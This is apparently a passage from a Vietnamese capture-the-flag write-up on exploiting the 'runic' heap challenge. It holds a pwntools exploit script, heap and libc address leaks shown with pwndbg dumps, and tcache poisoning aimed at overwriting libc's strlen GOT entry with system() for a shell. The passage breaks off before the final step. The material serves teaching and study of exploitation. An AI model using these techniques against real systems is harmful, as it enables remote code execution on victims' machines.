Tại đây, thay vì sử dụng \texttt{new\_index} để lấy trường \texttt{length}, chương trình lại tính \texttt{current\_index} dựa trên \texttt{hash(content)} - tên đã được sao chép vào chunk C thông qua \texttt{strcpy(content, new\_name)}.

Cần lưu ý rằng \texttt{new\_name} ban đầu được nhập vào thông qua \texttt{read(0, new\_name, 8u)}. Hàm \texttt{read()} thông thường ngừng đọc khi đã đọc đủ số lượng bytes được chỉ định trong tham số hoặc gặp EOF, không quan tâm đến ký tự NULL hay ký tự xuống dòng. Trong khi đó, \texttt{strcpy()} ngừng sao chép khi đã đủ ký tự hoặc gặp ký tự NULL trong chuỗi nguồn.

Do đó, việc sử dụng \texttt{strcpy()} không đảm bảo sao chép toàn bộ tên, vì tên được nhập có thể chứa ký tự NULL ở giữa. Điều này dẫn đến việc tính toán hash có thể bị sai lệch, khiến \texttt{current\_index} không phải là \texttt{new\_index}. Kết quả là việc lấy trường \texttt{length} tại \texttt{MainTable[current\_index]->length} cũng có thể cho ra giá trị nhỏ hơn hoặc lớn hơn độ dài thực tế.

Cùng xem xét một ví dụ sau (Figure 11), giả sử hiện đang có rune thứ nhất với tên \texttt{\textbackslash x01}, được ánh xạ đến index 1, và rune thứ hai với tên \texttt{\textbackslash x02}, được ánh xạ đến index 2.

\begin{figure}[H]
\centering
\includegraphics[width=\linewidth]{images/image-5.png}
\caption{Ví dụ minh họa: Trạng thái ban đầu với hai rune có tên \texttt{\textbackslash x01} và \texttt{\textbackslash x02}}
\end{figure}

Tiếp theo, chúng ta thực hiện edit rune thứ nhất với tên mới là \texttt{new\_name = \textbackslash x02\textbackslash x00\textbackslash x01}. Tên mới này sẽ được ánh xạ tới \texttt{new\_index} là 3. Tuy nhiên, do tên mới chứa NULL byte ở giữa, khi tên mới được sao chép vào chunk, \texttt{strcpy()} chỉ lấy đến \texttt{\textbackslash x02} và kết thúc tại NULL terminator.

\begin{figure}[H]
\centering
\includegraphics[width=\linewidth]{images/image-6.png}
\caption{Sau khi edit với \texttt{new\_name} chứa NULL byte, \texttt{strcpy()} chỉ sao chép đến \texttt{\textbackslash x02}}
\end{figure}

Vậy \texttt{current\_index} không phải là 3 mà là 2, dẫn đến việc lấy ra \texttt{length2} thay vì \texttt{length}. Trong trường hợp \texttt{length2} lớn hơn \texttt{length}, lệnh\\\texttt{read(0, content + 8, MainTable[current\_index]->length)} có thể gây ra heap buffer overflow. Lỗ hổng này cho phép kẻ tấn công ghi đè để giả mạo kích thước, con trỏ \texttt{fd}, con trỏ \texttt{bk} của chunk liền sau, hoặc có thể làm rò rỉ địa chỉ trên heap và địa chỉ trong thư viện libc.

ASLR (Address Space Layout Randomization) là cơ chế bảo vệ ngẫu nhiên hóa vị trí các vùng nhớ quan trọng (stack, heap, thư viện, binary) mỗi lần chương trình khởi động, khiến kẻ tấn công không thể dự đoán trước địa chỉ cụ thể. Việc leak được địa chỉ heap và libc cho phép tính toán các địa chỉ thực tế của các hàm và cấu trúc dữ liệu quan trọng, từ đó bypass được ASLR và tiến hành các bước khai thác tiếp theo.

\clearpage
\section{Exploitation}

Quá trình khai thác được thực hiện thông qua một exploit script viết bằng Python sử dụng framework \texttt{pwntools}. Script này (đặt tên là \texttt{solve.py}) cung cấp các hàm tiện ích để tương tác với chương trình mục tiêu một cách có cấu trúc và dễ dàng. Các hàm wrapper được định nghĩa bao gồm \texttt{create()} để tạo rune mới, \texttt{delete()} để xóa rune, \texttt{edit()} để chỉnh sửa rune, và \texttt{show()} để hiển thị nội dung rune.

\begin{lstlisting}[language=Python]
#!/usr/bin/env python3

from pwn import *

exe = ELF("runic_patched", checksec=False)
libc = ELF("libc.so.6", checksec=False)
ld = ELF("ld.so", checksec=False)

context.terminal = ["tilix", "-a", "session-add-right", "-e"]
context.binary = exe

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rc = lambda p, n: p.recv(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

gdbscript = '''
set follow-fork-mode parent
set detach-on-fork on
continue
'''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
        if args.DEBUG:
            context.log_level = 'debug'
        return p
    else:
        host = ""
        port = 0
        return remote(host, port)

p = conn()

def create(name, length, contents):
    sla(p, b'Action:', b'1')
    sa(p, b'name:', name)
    sla(p, b'length:', str(length).encode())
    if length > 0:
        sa(p, b'contents:', contents)

def delete(name):
    sla(p, b'Action:', b'2')
    sa(p, b'name:', name)

def edit(old_name, new_name, contents):
    sla(p, b'Action:', b'3')
    sa(p, b'Rune name:', old_name)
    sa(p, b'New name:', new_name)
    sa(p, b'Rune contents: \n', contents)

def show(name):
    sla(p, b'Action:', b'4')
    sa(p, b'Rune name:', name)
    ru(p, b'Rune contents:\n\n')
    return rl(p).strip()

# code goes here...

ia(p)
\end{lstlisting}

Script có thể được thực thi với các chế độ hoạt động khác nhau thông qua tham số dòng lệnh:

\begin{itemize}
  \item \textbf{LOCAL}: Kết nối đến process đang chạy trên máy cục bộ thay vì kết nối remote đến server.
  \item \textbf{GDB}: Gắn pwndbg vào process đang chạy, hiển thị giao diện debug trên terminal bên phải nhằm hỗ trợ phân tích và theo dõi quá trình thực thi.
  \item \textbf{DEBUG}: In ra các thông tin chi tiết trong quá trình tương tác với process, bao gồm dữ liệu được gửi đi và nhận về.
  \item \textbf{NOASLR}: Tạm thời vô hiệu hóa cơ chế bảo vệ ASLR, ngăn chặn việc ngẫu nhiên hóa địa chỉ của heap và libc khi debug với GDB.
\end{itemize}

Hình ảnh dưới đây minh họa cách thực thi script với các tham số phù hợp:

\begin{figure}[H]
\centering
\includegraphics[width=\linewidth]{images/image-13.png}
\caption{Ví dụ chạy script khai thác}
\end{figure}

\subsection{Leaking Heap Address}

Bước đầu tiên trong chuỗi khai thác là leak địa chỉ heap nhằm bypass cơ chế ASLR. Kỹ thuật này dựa trên việc lợi dụng cấu trúc tcache bin của ptmalloc. Cụ thể, khi một chunk được giải phóng vào tcache, ptmalloc sẽ ghi con trỏ \texttt{fd} (forward pointer) vào chunk đó, trỏ đến chunk tiếp theo trong bin hoặc NULL nếu đây là chunk duy nhất.

Chiến lược khai thác như sau: đầu tiên, cấp phát hai chunk liền kề nhau trên heap, sau đó giải phóng chunk thứ hai vào tcache bin. Tiếp theo, khai thác lỗ hổng buffer overflow trong hàm \texttt{edit()} để ghi tràn từ chunk thứ nhất sang chunk thứ hai, ghi đè trường \texttt{size} để loại bỏ NULL terminator giữa hai chunk. Cuối cùng, khi gọi hàm \texttt{show()} trên chunk thứ nhất, hàm \texttt{puts()} sẽ in liên tục cho đến khi gặp NULL byte, leak cả con trỏ \texttt{fd} của chunk thứ hai. Từ địa chỉ này, có thể tính ngược lại để xác định địa chỉ cơ sở của heap.

Để thực hiện kỹ thuật này trong thực tế, cần cấp phát ba chunk với cấu hình như sau:

\begin{itemize}
  \item Chunk với \texttt{name=\textbackslash x01} được gọi là chunk 1.
  \item Chunk với \texttt{name=\textbackslash x02} được gọi là chunk 2.
  \item Tương tự với chunk 3.
\end{itemize}

\begin{lstlisting}[language=Python]
create(b'\x01', 0x10, b'A')
create(b'\x02', 0x10, b'A')
create(b'\x03', 0x60, b'A')

delete(b'\x02')
\end{lstlisting}

Chunk 3 được tạo với kích thước lớn (\texttt{0x60}) nhằm khai thác lỗ hổng: sau khi giải phóng chunk 2 vào tcache bin, chunk 1 sẽ được chỉnh sửa với tên mới để "mượn" kích thước lớn của chunk 3, cho phép ghi tràn sang chunk 2. Trạng thái heap sau khi giải phóng chunk 2 có thể quan sát qua pwndbg:

\begin{lstlisting}[language=Python]
pwndbg> x/50gx 0x55555555c290
0x55555555c290: 0x0000000000000000 0x0000000000000021  # <-- chunk 1
0x55555555c2a0: 0x0000000000000001 0x0000000000000041
0x55555555c2b0: 0x0000000000000000 0x0000000000000021  # <-- chunk 2
0x55555555c2c0: 0x000000055555555c 0xb7a28a32de447efd
0x55555555c2d0: 0x0000000000000000 0x0000000000000071  # <-- chunk 3
0x55555555c2e0: 0x0000000000000003 0x0000000000000041
0x55555555c2f0: 0x0000000000000000 0x0000000000000000
0x55555555c300: 0x0000000000000000 0x0000000000000000
0x55555555c310: 0x0000000000000000 0x0000000000000000
0x55555555c320: 0x0000000000000000 0x0000000000000000
0x55555555c330: 0x0000000000000000 0x0000000000000000
0x55555555c340: 0x0000000000000000 0x0000000000020cc1  # <-- top chunk
0x55555555c350: 0x0000000000000000 0x0000000000000000
0x55555555c360: 0x0000000000000000 0x0000000000000000
0x55555555c370: 0x0000000000000000 0x0000000000000000
0x55555555c380: 0x0000000000000000 0x0000000000000000
\end{lstlisting}

Chunk 2 đã được đưa vào tcache bin (entry size \texttt{0x20}), và ptmalloc đã ghi con trỏ \texttt{fd} với giá trị \texttt{0x000000055555555c} vào vị trí dữ liệu của chunk này.

\begin{figure}[H]
\centering
\includegraphics[width=0.75\linewidth]{images/image-14.png}
\caption{Tcache bin entry size 0x20}
\end{figure}

Tiếp theo, thực hiện edit chunk 1 với tên mới \texttt{\textbackslash x03\textbackslash x00\textbackslash x01}. Do tên này chứa NULL byte ở giữa, khi \texttt{strcpy()} sao chép vào chunk, nó chỉ lấy \texttt{\textbackslash x03}, dẫn đến \texttt{current\_index} được tính dựa trên hash của \texttt{\textbackslash x03} thay vì \texttt{\textbackslash x03\textbackslash x00\textbackslash x01}. Kết quả là chunk 1 được phép ghi với độ dài lớn hơn (kích thước của chunk 3), cho phép ghi đè \texttt{24} byte qua trường size của chunk 2.

\begin{lstlisting}[language=Python]
edit(b'\x01', b'\x03\x00\x01', b'A' * 24)
\end{lstlisting}

Heap hiện tại trông như sau:

\begin{lstlisting}[language=Python]
pwndbg> x/16gx 0x55555555c290
0x55555555c290: 0x0000000000000000 0x0000000000000021  # <-- chunk 1
0x55555555c2a0: 0x0000000000000001 0x4141414141414141
0x55555555c2b0: 0x4141414141414141 0x4141414141414141  # <-- chunk 2
0x55555555c2c0: 0x000000055555555c 0xb7a28a32de447efd
0x55555555c2d0: 0x0000000000000000 0x0000000000000071  # <-- chunk 3
0x55555555c2e0: 0x0000000000000003 0x0000000000000041
0x55555555c2f0: 0x0000000000000000 0x0000000000000000
0x55555555c300: 0x0000000000000000 0x0000000000000000
\end{lstlisting}

Khi gọi \texttt{show()} trên chunk 1, hàm \texttt{puts()} sẽ in liên tục qua cả chunk 2, leak được con trỏ \texttt{fd} có giá trị \texttt{0x000000055555555c}.

Cần lưu ý rằng từ GLIBC phiên bản 2.32 trở đi, con trỏ \texttt{fd} trong tcache đã được mã hóa bằng cơ chế Safe-Linking theo công thức $\text{PROTECT}(P) = (L \gg 12) \oplus P$, trong đó $L$ là địa chỉ trên heap mà con trỏ \texttt{fd} được ghi vào và $P$ là giá trị thực cần được bảo vệ. Tuy nhiên, do chunk 2 là chunk duy nhất trong tcache bin này, con trỏ \texttt{fd} của nó trỏ tới NULL ($P = 0$), dẫn đến giá trị được mã hóa chính là $L \gg 12$.

Vì tất cả địa chỉ trong cùng một memory page (4KB) đều có 12 bit thấp khác nhau nhưng các bit cao giống nhau, việc dịch phải 12 bit sẽ có được địa chỉ cơ sở của page đó. Do đó, từ giá trị leak được, chỉ cần dịch trái 12 bit để thu được địa chỉ heap base. Sau khi hoàn tất việc leak, chunk 2 được cấp phát lại để dọn dẹp tcache bin và giữ heap trong trạng thái sạch sẽ cho các bước tiếp theo.

\begin{lstlisting}[language=Python]
heap_base = u64(show(b'\x03\x00\x01')[24:].ljust(8, b'\0')) << 12
print(f"heap base: {hex(heap_base)}")
create(b'\x02', 0x10, b'A')
\end{lstlisting}

Kết quả leak được xác nhận qua lệnh \texttt{vmmap} trong pwndbg:

\begin{figure}[H]
\centering
\includegraphics[width=\linewidth]{images/image-15.png}
\caption{Xác nhận heap base address}
\end{figure}

\subsection{Leaking Libc Address}

Bước tiếp theo là leak địa chỉ libc để có thể gọi các hàm nguy hiểm hệ thống. Để thực hiện điều này, cần giải phóng một chunk vào unsorted bin, nơi ptmalloc sẽ ghi các con trỏ \texttt{fd} và \texttt{bk} trỏ về main arena (nằm trong vùng nhớ của libc).

Tuy nhiên, chương trình có những hạn chế khiến việc này không thể thực hiện trực tiếp: kích thước cấp phát tối đa chỉ là \texttt{0x60} bytes, quá nhỏ để tự động đưa vào unsorted bin (cần lớn hơn \texttt{0x410} bytes). Ngoài ra, không thể lợi dụng cơ chế làm đầy tcache vì các chunk kích thước nhỏ hơn \texttt{0x80} bytes sẽ rơi vào fastbin thay vì unsorted bin.

Giải pháp là tiếp tục khai thác lỗ hổng buffer overflow để kích thước của một chunk thành \texttt{0x410} bytes. Khi chunk này được giải phóng, ptmalloc sẽ coi nó đủ lớn và đưa vào unsorted bin. Sau đó, cấp phát lại một phần nhỏ của chunk để leak con trỏ \texttt{fd}, từ đó tính được địa chỉ base của libc.

Triển khai cụ thể như sau: cấp phát ba chunk mới (chunk 5, 6, 7). Chunk 5 sẽ được dùng để overflow vào chunk 6, ghi đè trường \texttt{size} thành \texttt{0x421}. Chunk 6 được chọn có kích thước \texttt{0x60} bytes để sau khi giải phóng vào unsorted bin, có thể cấp phát lại một phần nhỏ (\texttt{0x10} bytes) tránh heap bị corrupt quá nhiều.

\begin{lstlisting}[language=Python]
create(b'\x05', 0x10, b'A')
create(b'\x06', 0x60, b'A')
create(b'\x07', 0x60, b'A')

edit(b'\x05', b'\x07\x00\x01', b'A' * 16 + p64(0x421))

delete(b'\x06')
\end{lstlisting}

Tuy nhiên, khi thử giải phóng chunk 6, chương trình bị terminate bởi GLIBC với lỗi "double free or corruption (!prev)" như sau ở Figure 16:

\begin{figure}[H]
\centering
\includegraphics[width=\linewidth]{images/image-16.png}
\caption{Lỗi double free khi giải phóng chunk 6}
\end{figure}

Nguyên nhân là cơ chế kiểm tra an toàn của ptmalloc. Khi giải phóng một chunk vào unsorted bin, ptmalloc kiểm tra \texttt{prev\_inuse} bit của chunk "liền sau" để đảm bảo chunk hiện tại đang được sử dụng (không bị double free). Điểm quan trọng đó là, vị trí chunk "liền sau" không phải là chunk kế tiếp trong bộ nhớ, mà được tính bằng công thức: $\text{next\_chunk} = \text{current\_chunk} + \text{current\_size}$.

Trạng thái heap sau khi ghi đè \texttt{size} của chunk 6 thành \texttt{0x420}:

\begin{lstlisting}[language=Python]
pwndbg> x/50gx 0x55555555c290                                     
0x55555555c290: 0x0000000000000000 0x0000000000000021             
0x55555555c2a0: 0x0000000000000003 0x4141414141414141             
0x55555555c2b0: 0x4141414141414141 0x4141414141414141             
0x55555555c2c0: 0x0000000555550002 0x0000000000000041             
0x55555555c2d0: 0x0000000000000000 0x0000000000000071             
0x55555555c2e0: 0x0000000000000003 0x0000000000000041             
0x55555555c2f0: 0x0000000000000000 0x0000000000000000             
0x55555555c300: 0x0000000000000000 0x0000000000000000             
0x55555555c310: 0x0000000000000000 0x0000000000000000             
0x55555555c320: 0x0000000000000000 0x0000000000000000             
0x55555555c330: 0x0000000000000000 0x0000000000000000             
0x55555555c340: 0x0000000000000000 0x0000000000000021  # <-- chunk 5
0x55555555c350: 0x0000000000000007 0x4141414141414141
0x55555555c360: 0x4141414141414141 0x0000000000000421  # <-- chunk 6
0x55555555c370: 0x0000000000000006 0x0000000000000041
0x55555555c380: 0x0000000000000000 0x0000000000000000
0x55555555c390: 0x0000000000000000 0x0000000000000000
0x55555555c3a0: 0x0000000000000000 0x0000000000000000
0x55555555c3b0: 0x0000000000000000 0x0000000000000000
0x55555555c3c0: 0x0000000000000000 0x0000000000000000
0x55555555c3d0: 0x0000000000000000 0x0000000000000071  # <-- chunk 7
0x55555555c3e0: 0x0000000000000007 0x0000000000000041
0x55555555c3f0: 0x0000000000000000 0x0000000000000000
0x55555555c400: 0x0000000000000000 0x0000000000000000
0x55555555c410: 0x0000000000000000 0x0000000000000000
\end{lstlisting}

Với chunk 6 có \texttt{size = 0x421}, ptmalloc tính địa chỉ chunk tiếp theo:

\begin{lstlisting}[language=Python]
pwndbg> p/x 0x55555555c360 + 0x420
$1 = 0x55555555c780
\end{lstlisting}

Tại địa chỉ này không có dữ liệu gì (toàn NULL), nên \texttt{prev\_inuse} bit bằng \texttt{0}, khiến ptmalloc nghĩ chunk 6 đã được giải phóng trước đó:

\begin{lstlisting}[language=Python]
pwndbg> x/10gx 0x55555555c780
0x55555555c780: 0x0000000000000000 0x0000000000000000
0x55555555c790: 0x0000000000000000 0x0000000000000000
0x55555555c7a0: 0x0000000000000000 0x0000000000000000
0x55555555c7b0: 0x0000000000000000 0x0000000000000000
0x55555555c7c0: 0x0000000000000000 0x0000000000000000
\end{lstlisting}

Giải pháp đó là cấp phát nhiều chunk để "lấp đầy" vùng nhớ từ chunk 7 đến địa chỉ \texttt{0x55555555c780}, sau đó ghi một chunk header giả tại đó với \texttt{prev\_inuse} bit được set (LSB của \texttt{size} = 1):

\begin{lstlisting}[language=Python]
create(b'\x05', 0x10, b'A')
create(b'\x06', 0x60, b'A')
create(b'\x07', 0x60, b'A')

create(b'\x09', 0x60, b'A')
create(b'\x10', 0x60, b'A')
create(b'\x11', 0x60, b'A')
create(b'\x12', 0x60, b'A')
create(b'\x13', 0x60, b'A')
create(b'\x14', 0x60, b'A')
create(b'\x15', 0x60, b'A')
create(b'\x16', 0x60, p64(0) * 4 + b'A')

edit(b'\x05', b'\x07\x00\x01', b'A' * 16 + p64(0x421))
\end{lstlisting}

Sau khi cấp phát các chunk này, heap layout sẽ có chunk header giả tại \texttt{0x55555555c780}:

\begin{lstlisting}[language=Python]
pwndbg> x/50gx 0x55555555c290
0x55555555c290:	0x0000000000000000	0x0000000000000021
0x55555555c2a0:	0x0000000000000003	0x4141414141414141
0x55555555c2b0:	0x4141414141414141	0x4141414141414141
0x55555555c2c0:	0x0000000555550002	0x0000000000000041
0x55555555c2d0:	0x0000000000000000	0x0000000000000071
0x55555555c2e0:	0x0000000000000003	0x0000000000000041
0x55555555c2f0:	0x0000000000000000	0x0000000000000000
0x55555555c300:	0x0000000000000000	0x0000000000000000
0x55555555c310:	0x0000000000000000	0x0000000000000000
0x55555555c320:	0x0000000000000000	0x0000000000000000
0x55555555c330:	0x0000000000000000	0x0000000000000000
0x55555555c340:	0x0000000000000000	0x0000000000000021 # <-- chunk 5
0x55555555c350:	0x0000000000000007	0x4141414141414141
0x55555555c360:	0x4141414141414141	0x0000000000000421 # <-- chunk 6
0x55555555c370:	0x0000000000000006	0x0000000000000041
0x55555555c380:	0x0000000000000000	0x0000000000000000
0x55555555c390:	0x0000000000000000	0x0000000000000000
0x55555555c3a0:	0x0000000000000000	0x0000000000000000
0x55555555c3b0:	0x0000000000000000	0x0000000000000000
0x55555555c3c0:	0x0000000000000000	0x0000000000000000
0x55555555c3d0:	0x0000000000000000	0x0000000000000071 # <-- chunk 7
0x55555555c3e0:	0x0000000000000007	0x0000000000000041
...
pwndbg> 
0x55555555c750:	0x0000000000000000	0x0000000000000071
0x55555555c760:	0x0000000000000016	0x0000000000000000
0x55555555c770:	0x0000000000000000	0x0000000000000000
0x55555555c780:	0x0000000000000000	0x0000000000000041 # <-- "next chunk"
0x55555555c790:	0x0000000000000000	0x0000000000000000
0x55555555c7a0:	0x0000000000000000	0x0000000000000000
0x55555555c7b0:	0x0000000000000000	0x0000000000000000
0x55555555c7c0:	0x0000000000000000	0x0000000000020841
0x55555555c7d0:	0x0000000000000000	0x0000000000000000
0x55555555c7e0:	0x0000000000000000	0x0000000000000000
\end{lstlisting}

Bây giờ ptmalloc tìm thấy một chunk header hợp lệ tại \texttt{0x55555555c780} với \texttt{prev\_inuse} bit được set (\texttt{0x41}), cho phép giải phóng chunk 6 vào unsorted bin thành công. Sau đó, cấp phát lại một phần nhỏ:

\begin{lstlisting}[language=Python]
delete(b'\x06')
create(b'\x06', 0x10, b'A')
\end{lstlisting}

Chunk 6 gốc (kích thước \texttt{0x420}) được split: \texttt{0x20} bytes đầu được cấp phát lại, phần còn lại (\texttt{0x400} bytes) quay trở lại unsorted bin. Heap layout hiện tại trông như sau:

\begin{lstlisting}[language=Python]
pwndbg> x/50gx 0x55555555c290
0x55555555c290:	0x0000000000000000	0x0000000000000021
0x55555555c2a0:	0x0000000000000003	0x4141414141414141
0x55555555c2b0:	0x4141414141414141	0x4141414141414141
0x55555555c2c0:	0x0000000555550002	0x0000000000000041
0x55555555c2d0:	0x0000000000000000	0x0000000000000071
0x55555555c2e0:	0x0000000000000003	0x0000000000000041
0x55555555c2f0:	0x0000000000000000	0x0000000000000000
0x55555555c300:	0x0000000000000000	0x0000000000000000
0x55555555c310:	0x0000000000000000	0x0000000000000000
0x55555555c320:	0x0000000000000000	0x0000000000000000
0x55555555c330:	0x0000000000000000	0x0000000000000000
0x55555555c340:	0x0000000000000000	0x0000000000000021 # <-- chunk 5
0x55555555c350:	0x0000000000000007	0x4141414141414141
0x55555555c360:	0x4141414141414141	0x0000000000000021 # <-- chunk 6 (current)
0x55555555c370:	0x00001555553f0006	0x00001555553f3041
0x55555555c380:	0x000055555555c360	0x0000000000000401 # <-- remainder in unsorted bin
0x55555555c390:	0x00001555553f2cc0	0x00001555553f2cc0
0x55555555c3a0:	0x0000000000000000	0x0000000000000000
0x55555555c3b0:	0x0000000000000000	0x0000000000000000
0x55555555c3c0:	0x0000000000000000	0x0000000000000000
0x55555555c3d0:	0x0000000000000000	0x0000000000000071 # <-- chunk 7
0x55555555c3e0:	0x0000000000000007	0x0000000000000041
0x55555555c3f0:	0x0000000000000000	0x0000000000000000
0x55555555c400:	0x0000000000000000	0x0000000000000000
0x55555555c410:	0x0000000000000000	0x0000000000000000
\end{lstlisting}

Bây giờ, tại offset \texttt{0x8} trong chunk 6 (\texttt{0x55555555c370}), là một địa chỉ trong libc:\\\texttt{0x00001555553f3041}. Gọi \texttt{show()} để leak địa chỉ này. Từ địa chỉ này, tính offset để tìm libc base:

\begin{lstlisting}[language=Python]
pwndbg> vmmap libc.so.6
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
►   0x155555200000     0x15555522c000 r--p    2c000       0 libc.so.6
►   0x15555522c000     0x155555399000 r-xp   16d000   2c000 libc.so.6
►   0x155555399000     0x1555553ef000 r--p    56000  199000 libc.so.6
►   0x1555553ef000     0x1555553f2000 r--p     3000  1ee000 libc.so.6
►   0x1555553f2000     0x1555553f5000 rw-p     3000  1f1000 libc.so.6
    0x1555553f5000     0x155555402000 rw-p     d000       0 [anon_1555553f5]
pwndbg> p/x 0x00001555553f3041 - 0x155555200000
$1 = 0x1f3041
\end{lstlisting}

Leak và tính libc base:

\begin{lstlisting}[language=Python]
libc.address = u64(show(b'\x06').ljust(8, b'\0')) - 0x1f3041
print(f"libc base: {hex(libc.address)}")
\end{lstlisting}

Kết quả được xác nhận qua \texttt{vmmap} như dưới đây:

\begin{figure}[H]
\centering
\includegraphics[width=\linewidth]{images/image-17.png}
\caption{Xác nhận libc base address}
\end{figure}

\subsection{Remote Code Execution}

Sau khi đã leak được địa chỉ cơ sở của heap và của libc, vượt qua được cơ chế ASLR, kẻ tấn công có thể thực hiện nhiều kỹ thuật khác nhau tuỳ theo các cơ chế bảo vệ của binary hoặc của libc để mở một interactive shell nhằm chiếm quyền điều khiển máy nạn nhân. Cụ thể trong trường hợp này, chúng ta sẽ lợi dụng lỗ hổng heap buffer overflow và địa chỉ cơ sở của heap để thực hiện kỹ thuật tấn công tcache poisoning, ghi đè con trỏ \texttt{fd} (next) của một chunk đã được free vào tcache bin, dẫn đến khả năng đọc và ghi tại địa chỉ tuỳ ý.

Binary được bật Full RELRO nên không thể thực hiện GOT overwrite trong binary. Việc thực hiện ROP chain cũng phức tạp vì chưa leak được địa chỉ trên stack. Thực hiện hook overwrite đến \texttt{\_\_free\_hook} hoặc \texttt{\_\_malloc\_hook} cũng không khả thi vì GLIBC phiên bản 2.34 đã loại bỏ các hook này. Tuy nhiên, libc chỉ bật Partial RELRO nên phần GOT trong libc có thể bị overwrite.

\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{images/image-18.png}
    \caption{Full RELRO trong binary và Partial RELRO trong libc}
\end{figure}

Có thể xem các GOT entry của libc bằng lệnh \texttt{got -p libc} trong pwndbg như sau:

\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{images/image-19.png}
    \caption{Danh sách các GOT entry trong libc}
\end{figure}

Tuy nhiên, vấn đề là tại đây có rất nhiều GOT entry, không thể ghi đè ngẫu nhiên hay ghi đè toàn bộ được vì có thể làm crash chương trình. Do đó, cần quan sát lại mã giả để xác định các lời gọi hàm nhận vào tham số mà kẻ tấn công kiểm soát được, mà hàm đó gọi đến một trong các GOT entry của libc. Nếu kiểm soát tham số thành \texttt{/bin/sh} và ghi đè GOT entry tương ứng thành \texttt{system()}, lời gọi hàm đó sẽ trở thành \texttt{system("/bin/sh")}, từ đó spawn shell trên máy nạn nhân.

Có một vài lời gọi hàm khả thi sau:

\begin{itemize}
    \item \texttt{strcpy(content, name);} trong hàm \texttt{create()}.
    \item \texttt{free(MainTable[index]->content);} trong hàm \texttt{delete()}.
    \item \texttt{puts((const char *)MainTable[index]->content + 8);} trong hàm \texttt{show()}.
    \item Các lời gọi \texttt{strcpy()} tương tự trong \texttt{edit()}.
\end{itemize}

Ta tiến hành disassemble từng hàm:

\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{images/image-20.png}
    \caption{Disassembly hàm \texttt{strcpy()}}
\end{figure}

Hàm \texttt{strcpy()} không sử dụng đến GOT entry nào.

\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{images/image-21.png}
    \caption{Disassembly hàm \texttt{free()}}
\end{figure}

Hàm \texttt{free()} cũng vậy, không sử dụng GOT entry nào.

\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{images/image-22.png}
    \caption{Disassembly hàm \texttt{puts()}}
\end{figure}

Trong \texttt{puts()} có một lời gọi đến PLT entry, vậy chắc chắn trong đó sẽ gọi đến một GOT entry tương ứng:

\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{images/image-23.png}
    \caption{PLT entry trong \texttt{puts()}}
\end{figure}

Nằm tại địa chỉ \texttt{0x1555553f2098}, đó chính là GOT entry của \texttt{strlen()}:

\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{images/image-24.png}
    \caption{GOT entry của \texttt{strlen()}}
\end{figure}

Vậy nếu ghi đè địa chỉ của hàm \texttt{system()} vào GOT entry này, lời gọi hàm\\\texttt{puts((const char *)MainTable[index]->content + 8);} trong \texttt{show()} với tham số là con trỏ trỏ đến \texttt{/bin/sh} sẽ trở thành \texttt{system("/bin/sh")}.

Tiếp tục cấp phát 3 chunk như sau:

\begin{lstlisting}[language=Python]
create(b'\x17', 0x10, b'A')
create(b'\x18', 0x60, b'A')
create(b'\x19', 0x60, b'A')
\end{lstlisting}

Chunk 18 và 19 sẽ được đưa vào tcache bin, sau đó overflow từ chunk 17 để ghi đè con trỏ \texttt{fd} (next) của chunk 18 đến GOT entry của \texttt{strlen()}. Sau 2 lần cấp phát, sẽ có quyền ghi địa chỉ của hàm \texttt{system()} vào GOT entry.

Vì trước đó đã corrupt heap và free một chunk có kích thước giả lớn vào unsorted bin để leak địa chỉ libc, nên các chunk cấp phát sau này sẽ được cắt từ chunk trong unsorted bin ra. Do sử dụng kích thước giả, việc cấp phát bị sai lệch càng khiến heap bị corrupt. Do đó, cần cấp phát 3 chunk 17, 18, 19 trước khi làm giả kích thước và leak địa chỉ libc:

\begin{lstlisting}[language=Python]
create(b'\x05', 0x10, b'A')
create(b'\x06', 0x60, b'A')
create(b'\x07', 0x60, b'A')

create(b'\x09', 0x60, b'A')
create(b'\x10', 0x60, b'A')
create(b'\x11', 0x60, b'A')
create(b'\x12', 0x60, b'A')
create(b'\x13', 0x60, b'A')
create(b'\x14', 0x60, b'A')
create(b'\x15', 0x60, b'A')
create(b'\x16', 0x60, p64(0) * 4 + b'A')

create(b'\x17', 0x10, b'A')
create(b'\x18', 0x60, b'A')
create(b'\x19', 0x60, b'A')

edit(b'\x05', b'\x07\x00\x01', b'A' * 16 + p64(0x421))

delete(b'\x06')
create(b'\x06', 0x10, b'A')
libc.address = u64(show(b'\x06').ljust(8, b'\0')) - 0x1f3041
print(f"libc base: {hex(libc.address)}")
\end{lstlisting}

Tiếp tục cần tính toán con trỏ \texttt{fd} giả mạo để ghi đè. Vị trí GOT entry của \texttt{strlen()} có offset so với địa chỉ base của libc là:

\begin{lstlisting}[language=bash]
pwndbg> vmmap libc
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
►   0x155555200000     0x15555522c000 r--p    2c000       0 libc.so.6
►   0x15555522c000     0x155555399000 r-xp   16d000   2c000 libc.so.6
►   0x155555399000     0x1555553ef000 r--p    56000  199000 libc.so.6
►   0x1555553ef000     0x1555553f2000 r--p     3000  1ee000 libc.so.6
►   0x1555553f2000     0x1555553f5000 rw-p     3000  1f1000 libc.so.6
    0x1555553f5000     0x155555402000 rw-p     d000       0 [anon_1555553f5]
pwndbg> p/x 0x1555553f2098 - 0x155555200000
$2 = 0x1f2098
\end{lstlisting}

Vậy con trỏ \texttt{fd} có thể được tính toán như sau:

